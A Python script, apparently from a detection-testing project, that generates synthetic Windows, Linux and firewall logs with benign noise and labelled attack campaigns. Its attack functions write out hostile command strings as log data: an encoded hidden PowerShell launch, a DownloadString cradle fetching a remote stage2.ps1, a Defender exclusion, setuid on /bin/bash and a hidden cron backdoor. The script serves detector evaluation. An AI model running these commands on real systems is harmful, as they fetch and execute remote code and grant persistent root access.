"""
generate_logs.py
Generates 3 days of realistic-looking raw logs from a Windows PC, a Linux
server, and a firewall, with benign background activity plus a set of
labeled attack campaigns injected at random times. The labels are written
to ground_truth.json and are NOT available to the detection engine -- they
exist only so evaluate.py can score true/false positives afterward.
"""
import random
import datetime
import json
import os

random.seed(42)

OUT_DIR = os.path.join(os.path.dirname(__file__), "..", "data")
os.makedirs(OUT_DIR, exist_ok=True)

START = datetime.datetime(2026, 9, 22, 0, 0, 0)
END = datetime.datetime(2026, 9, 25, 0, 0, 0)

HOSTS = {
    "WIN-DESKTOP01": {"ip": "10.0.0.15", "os": "windows"},
    "WIN-DESKTOP02": {"ip": "10.0.0.16", "os": "windows"},
    "LINUX-SRV01": {"ip": "10.0.0.21", "os": "linux"},
    "LINUX-SRV02": {"ip": "10.0.0.22", "os": "linux"},
}
WIN_HOSTS = [h for h, v in HOSTS.items() if v["os"] == "windows"]
LINUX_HOSTS = [h for h, v in HOSTS.items() if v["os"] == "linux"]

USERS = ["jsmith", "agarcia", "mchen", "svc_backup"]
INTERNAL_CLIENT_IPS = ["10.0.0.50", "10.0.0.51", "10.0.0.52", "10.0.0.53"]

# external IP -> rough geo, used for the impossible-login detector
EXTERNAL_GEO = {
    "203.0.113.7": "RU-Moscow",
    "198.51.100.23": "CN-Shanghai",
    "203.0.113.55": "NG-Lagos",
    "198.51.100.88": "BR-SaoPaulo",
    "192.0.2.10": "US-Ashburn",
    "192.0.2.44": "US-Ashburn",
    "203.0.113.90": "VN-Hanoi",
}
ATTACKER_IPS = list(EXTERNAL_GEO.keys())

win_lines, linux_lines, fw_lines = [], [], []
ground_truth = []
gt_counter = 0


def rand_time(day_offset_range=(0, 2), hour_range=(0, 24)):
    d = START + datetime.timedelta(days=random.uniform(*day_offset_range))
    d = d.replace(hour=0, minute=0, second=0, microsecond=0)
    seconds = random.uniform(hour_range[0] * 3600, hour_range[1] * 3600)
    return d + datetime.timedelta(seconds=seconds)


def wfmt(t):
    return t.strftime("%Y-%m-%d %H:%M:%S")


def lfmt(t):
    return t.strftime("%b %d %H:%M:%S").replace(" 0", "  ") if t.day < 10 else t.strftime("%b %d %H:%M:%S")


def add_gt(attack_type, start, end, src_ip, target_host, mitre, note):
    global gt_counter
    gt_counter += 1
    ground_truth.append({
        "attack_id": f"ATK-{gt_counter:03d}",
        "attack_type": attack_type,
        "start": wfmt(start),
        "end": wfmt(end),
        "src_ip": src_ip,
        "target_host": target_host,
        "mitre_technique": mitre,
        "note": note,
    })
    return f"ATK-{gt_counter:03d}"


# ---------------------------------------------------------------------------
# BENIGN BACKGROUND TRAFFIC
# ---------------------------------------------------------------------------

def gen_benign():
    # Normal Windows logons during business hours
    for _ in range(220):
        t = rand_time((0, 3), (7, 19))
        host = random.choice(WIN_HOSTS)
        user = random.choice(USERS)
        ip = random.choice(INTERNAL_CLIENT_IPS + [HOSTS[host]["ip"]])
        win_lines.append((t, f"{wfmt(t)}|{host}|4624|SUCCESS_LOGON|User={user}|SourceIP={ip}|LogonType=3"))

    # occasional bad password typo, not an attack
    for _ in range(25):
        t = rand_time((0, 3), (7, 19))
        host = random.choice(WIN_HOSTS)
        user = random.choice(USERS)
        win_lines.append((t, f"{wfmt(t)}|{host}|4625|FAILED_LOGON|User={user}|SourceIP={HOSTS[host]['ip']}|LogonType=2|FailureReason=BadPassword"))

    # normal admin PowerShell usage
    normal_ps = ["Get-Process", "Get-Service", "Get-ChildItem C:\\Users", "Import-Module ActiveDirectory",
                 "Restart-Service Spooler", "Get-EventLog -LogName System -Newest 20"]
    for _ in range(60):
        t = rand_time((0, 3), (8, 18))
        host = random.choice(WIN_HOSTS)
        user = random.choice(USERS)
        cmd = random.choice(normal_ps)
        win_lines.append((t, f"{wfmt(t)}|{host}|4104|POWERSHELL_SCRIPTBLOCK|User={user}|ScriptBlock=\"{cmd}\""))

    # normal scheduled tasks / services (patching, backups)
    for _ in range(15):
        t = rand_time((0, 3), (2, 5))
        host = random.choice(WIN_HOSTS)
        win_lines.append((t, f"{wfmt(t)}|{host}|4698|SCHEDULED_TASK_CREATED|User=SYSTEM|TaskName=WindowsUpdateCheck|Command=C:\\Windows\\System32\\usoclient.exe"))

    # Linux normal SSH logons and sudo usage
    for _ in range(150):
        t = rand_time((0, 3), (7, 20))
        host = random.choice(LINUX_HOSTS)
        user = random.choice(USERS)
        ip = random.choice(INTERNAL_CLIENT_IPS)
        linux_lines.append((t, f"{lfmt(t)} {host} sshd[{random.randint(1000,9999)}]: Accepted password for {user} from {ip} port {random.randint(40000,60000)} ssh2"))

    normal_sudo = ["/bin/systemctl status nginx", "/usr/bin/tail -f /var/log/syslog",
                   "/bin/systemctl restart cron", "/usr/bin/df -h", "/usr/bin/apt update"]
    for _ in range(70):
        t = rand_time((0, 3), (8, 18))
        host = random.choice(LINUX_HOSTS)
        user = random.choice(USERS)
        cmd = random.choice(normal_sudo)
        linux_lines.append((t, f"{lfmt(t)} {host} sudo: {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND={cmd}"))

    # normal cron
    for _ in range(30):
        t = rand_time((0, 3), (0, 24))
        host = random.choice(LINUX_HOSTS)
        linux_lines.append((t, f"{lfmt(t)} {host} CRON[{random.randint(1000,9999)}]: (root) CMD (/usr/local/bin/nightly_backup.sh)"))

    # normal firewall allow traffic, small transfers, common ports
    common_ports = [443, 80, 53, 123, 22]
    for _ in range(500):
        t = rand_time((0, 3), (0, 24))
        src = random.choice(list(HOSTS.values()))["ip"]
        dst = f"192.0.2.{random.randint(20,60)}"
        port = random.choice(common_ports)
        size = random.randint(500, 200000)
        fw_lines.append((t, f"{wfmt(t)},{src},{dst},{port},TCP,ALLOW,{size}"))

    # normal moderate outbound (backups to cloud), not large enough to flag
    for _ in range(20):
        t = rand_time((0, 3), (1, 4))
        src = random.choice(LINUX_HOSTS)
        size = random.randint(2_000_000, 15_000_000)
        fw_lines.append((t, f"{wfmt(t)},{HOSTS[src]['ip']},192.0.2.99,443,TCP,ALLOW,{size}"))


# ---------------------------------------------------------------------------
# ATTACK CAMPAIGNS
# ---------------------------------------------------------------------------

def attack_brute_force_windows():
    t0 = rand_time((0, 2), (1, 4))
    host = random.choice(WIN_HOSTS)
    attacker = random.choice(ATTACKER_IPS)
    aid = add_gt("brute_force", t0, t0 + datetime.timedelta(minutes=6), attacker, host,
                 "T1110", "RDP brute force against local admin account")
    t = t0
    for i in range(22):
        t += datetime.timedelta(seconds=random.uniform(5, 20))
        win_lines.append((t, f"{wfmt(t)}|{host}|4625|FAILED_LOGON|User=administrator|SourceIP={attacker}|LogonType=10|FailureReason=BadPassword|GT={aid}"))
    t += datetime.timedelta(seconds=15)
    win_lines.append((t, f"{wfmt(t)}|{host}|4624|SUCCESS_LOGON|User=administrator|SourceIP={attacker}|LogonType=10|GT={aid}"))


def attack_brute_force_linux():
    t0 = rand_time((0, 2), (2, 5))
    host = random.choice(LINUX_HOSTS)
    attacker = random.choice(ATTACKER_IPS)
    aid = add_gt("brute_force", t0, t0 + datetime.timedelta(minutes=5), attacker, host,
                 "T1110", "SSH brute force against root")
    t = t0
    for i in range(30):
        t += datetime.timedelta(seconds=random.uniform(3, 12))
        linux_lines.append((t, f"{lfmt(t)} {host} sshd[{random.randint(1000,9999)}]: Failed password for root from {attacker} port {random.randint(30000,50000)} ssh2 GT={aid}"))


def attack_powershell():
    t0 = rand_time((0, 3), (10, 22))
    host = random.choice(WIN_HOSTS)
    user = random.choice(USERS)
    aid = add_gt("suspicious_powershell", t0, t0 + datetime.timedelta(minutes=2), HOSTS[host]["ip"], host,
                 "T1059.001", "Encoded download-and-execute PowerShell cradle")
    cmds = [
        "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
        "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/stage2.ps1')",
        "Add-MpPreference -ExclusionPath 'C:\\Users\\Public'",
    ]
    t = t0
    for c in cmds:
        win_lines.append((t, f"{wfmt(t)}|{host}|4104|POWERSHELL_SCRIPTBLOCK|User={user}|ScriptBlock=\"{c}\"|GT={aid}"))
        t += datetime.timedelta(seconds=random.uniform(10, 40))


def attack_port_scan():
    t0 = rand_time((0, 3), (1, 5))
    host = random.choice(list(HOSTS.keys()))
    attacker = random.choice(ATTACKER_IPS)
    ports = random.sample(range(1, 10000), 40)
    aid = add_gt("port_scan", t0, t0 + datetime.timedelta(seconds=90), attacker, host,
                 "T1046", "Sequential TCP port sweep")
    t = t0
    for p in ports:
        t += datetime.timedelta(seconds=random.uniform(0.5, 2.5))
        fw_lines.append((t, f"{wfmt(t)},{attacker},{HOSTS[host]['ip']},{p},TCP,DENY,60,GT={aid}"))


def attack_impossible_login():
    t0 = rand_time((0, 3), (9, 20))
    host = random.choice(WIN_HOSTS + LINUX_HOSTS)
    user = random.choice(USERS)
    ip_a, ip_b = random.sample(ATTACKER_IPS, 2)
    aid = add_gt("impossible_login", t0, t0 + datetime.timedelta(minutes=12), f"{ip_a}|{ip_b}", host,
                 "T1078", f"Same account logs in from {EXTERNAL_GEO[ip_a]} then {EXTERNAL_GEO[ip_b]} 8 min apart")
    if host in WIN_HOSTS:
        win_lines.append((t0, f"{wfmt(t0)}|{host}|4624|SUCCESS_LOGON|User={user}|SourceIP={ip_a}|LogonType=10|GT={aid}"))
        t1 = t0 + datetime.timedelta(minutes=8)
        win_lines.append((t1, f"{wfmt(t1)}|{host}|4624|SUCCESS_LOGON|User={user}|SourceIP={ip_b}|LogonType=10|GT={aid}"))
    else:
        linux_lines.append((t0, f"{lfmt(t0)} {host} sshd[{random.randint(1000,9999)}]: Accepted password for {user} from {ip_a} port {random.randint(30000,50000)} ssh2 GT={aid}"))
        t1 = t0 + datetime.timedelta(minutes=8)
        linux_lines.append((t1, f"{lfmt(t1)} {host} sshd[{random.randint(1000,9999)}]: Accepted password for {user} from {ip_b} port {random.randint(30000,50000)} ssh2 GT={aid}"))


def attack_privesc_linux():
    t0 = rand_time((0, 3), (0, 6))
    host = random.choice(LINUX_HOSTS)
    user = random.choice(["jsmith", "agarcia"])
    aid = add_gt("privilege_escalation", t0, t0 + datetime.timedelta(minutes=3), HOSTS[host]["ip"], host,
                 "T1548.003", "Standard user invoked sudo to root and edited sudoers, outside business hours")
    t = t0
    linux_lines.append((t, f"{lfmt(t)} {host} sudo: {user} : TTY=pts/1 ; PWD=/home/{user} ; USER=root ; COMMAND=/bin/bash GT={aid}"))
    t += datetime.timedelta(seconds=20)
    linux_lines.append((t, f"{lfmt(t)} {host} sudo: {user} : TTY=pts/1 ; PWD=/home/{user} ; USER=root ; COMMAND=/usr/sbin/visudo GT={aid}"))
    t += datetime.timedelta(seconds=20)
    linux_lines.append((t, f"{lfmt(t)} {host} sudo: root : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/chmod u+s /bin/bash GT={aid}"))


def attack_privesc_windows():
    t0 = rand_time((0, 3), (0, 6))
    host = random.choice(WIN_HOSTS)
    user = random.choice(["jsmith", "mchen"])
    aid = add_gt("privilege_escalation", t0, t0 + datetime.timedelta(minutes=2), HOSTS[host]["ip"], host,
                 "T1134", "Token manipulation / whoami priv enumeration by non-admin user")
    t = t0
    win_lines.append((t, f"{wfmt(t)}|{host}|4104|POWERSHELL_SCRIPTBLOCK|User={user}|ScriptBlock=\"whoami /priv\"|GT={aid}"))
    t += datetime.timedelta(seconds=15)
    win_lines.append((t, f"{wfmt(t)}|{host}|4672|SPECIAL_PRIVILEGES_ASSIGNED|User={user}|Privileges=SeDebugPrivilege|GT={aid}"))


def attack_new_admin():
    t0 = rand_time((0, 3), (22, 24))
    host = random.choice(WIN_HOSTS)
    aid = add_gt("new_admin_account", t0, t0 + datetime.timedelta(minutes=1), HOSTS[host]["ip"], host,
                 "T1136.001", "New local account created and immediately added to Administrators, after hours")
    t = t0
    win_lines.append((t, f"{wfmt(t)}|{host}|4720|USER_CREATED|User=administrator|NewAccount=svc_temp42|GT={aid}"))
    t += datetime.timedelta(seconds=8)
    win_lines.append((t, f"{wfmt(t)}|{host}|4732|MEMBER_ADDED_TO_GROUP|User=administrator|Account=svc_temp42|Group=Administrators|GT={aid}"))


def attack_new_admin_linux():
    t0 = rand_time((0, 3), (0, 4))
    host = random.choice(LINUX_HOSTS)
    aid = add_gt("new_admin_account", t0, t0 + datetime.timedelta(minutes=1), HOSTS[host]["ip"], host,
                 "T1136.001", "New Linux account created and added to sudo group overnight")
    t = t0
    linux_lines.append((t, f"{lfmt(t)} {host} useradd[{random.randint(1000,9999)}]: new user: name=svc_tmp, UID=1010 GT={aid}"))
    t += datetime.timedelta(seconds=6)
    linux_lines.append((t, f"{lfmt(t)} {host} usermod[{random.randint(1000,9999)}]: add 'svc_tmp' to group 'sudo' GT={aid}"))


def attack_persistence_task():
    t0 = rand_time((0, 3), (1, 5))
    host = random.choice(WIN_HOSTS)
    aid = add_gt("persistence", t0, t0 + datetime.timedelta(minutes=1), HOSTS[host]["ip"], host,
                 "T1053.005", "Scheduled task launching binary from a public/user-writable directory")
    t = t0
    win_lines.append((t, f"{wfmt(t)}|{host}|4698|SCHEDULED_TASK_CREATED|User=svc_temp42|TaskName=SystemHealthCheck|Command=C:\\Users\\Public\\upd.exe|GT={aid}"))
    t += datetime.timedelta(seconds=30)
    win_lines.append((t, f"{wfmt(t)}|{host}|7045|SERVICE_INSTALLED|User=svc_temp42|ServiceName=WinHelperSvc|BinaryPath=C:\\ProgramData\\svc.exe|GT={aid}"))


def attack_persistence_linux():
    t0 = rand_time((0, 3), (1, 5))
    host = random.choice(LINUX_HOSTS)
    aid = add_gt("persistence", t0, t0 + datetime.timedelta(minutes=1), HOSTS[host]["ip"], host,
                 "T1053.003", "Cron persistence job pointed at a hidden directory")
    t = t0
    linux_lines.append((t, f"{lfmt(t)} {host} CRON[{random.randint(1000,9999)}]: (root) CMD (/tmp/.hidden/backdoor.sh) GT={aid}"))
    t += datetime.timedelta(seconds=45)
    linux_lines.append((t, f"{lfmt(t)} {host} sshd[{random.randint(1000,9999)}]: authorized_keys modified for user svc_tmp GT={aid}"))


def attack_exfil():
    t0 = rand_time((0, 3), (22, 24))
    host = random.choice(LINUX_HOSTS + WIN_HOSTS)
    dest = random.choice(ATTACKER_IPS)
    size = random.randint(600_000_000, 2_000_000_000)
    aid = add_gt("large_outbound_transfer", t0, t0 + datetime.timedelta(minutes=1), HOSTS[host]["ip"], host,
                 "T1048", f"{size/1e6:.0f} MB pushed to an external IP late at night")
    fw_lines.append((t0, f"{wfmt(t0)},{HOSTS[host]['ip']},{dest},443,TCP,ALLOW,{size},GT={aid}"))


ATTACKS = (
    [attack_brute_force_windows] * 1 + [attack_brute_force_linux] * 1 +
    [attack_powershell] * 2 +
    [attack_port_scan] * 2 +
    [attack_impossible_login] * 2 +
    [attack_privesc_linux] * 1 + [attack_privesc_windows] * 1 +
    [attack_new_admin] * 1 + [attack_new_admin_linux] * 1 +
    [attack_persistence_task] * 1 + [attack_persistence_linux] * 1 +
    [attack_exfil] * 2
)


def main():
    gen_benign()
    for fn in ATTACKS:
        fn()

    win_lines.sort(key=lambda x: x[0])
    linux_lines.sort(key=lambda x: x[0])
    fw_lines.sort(key=lambda x: x[0])
    ground_truth.sort(key=lambda x: x["start"])

    with open(os.path.join(OUT_DIR, "windows_security.log"), "w") as f:
        f.write("\n".join(l for _, l in win_lines) + "\n")
    with open(os.path.join(OUT_DIR, "linux_auth.log"), "w") as f:
        f.write("\n".join(l for _, l in linux_lines) + "\n")
    with open(os.path.join(OUT_DIR, "firewall.log"), "w") as f:
        f.write("\n".join(l for _, l in fw_lines) + "\n")
    with open(os.path.join(OUT_DIR, "ground_truth.json"), "w") as f:
        json.dump(ground_truth, f, indent=2)

    print(f"windows lines: {len(win_lines)}")
    print(f"linux lines:   {len(linux_lines)}")
    print(f"firewall lines:{len(fw_lines)}")
    print(f"attack campaigns (ground truth): {len(ground_truth)}")


if __name__ == "__main__":
    main()
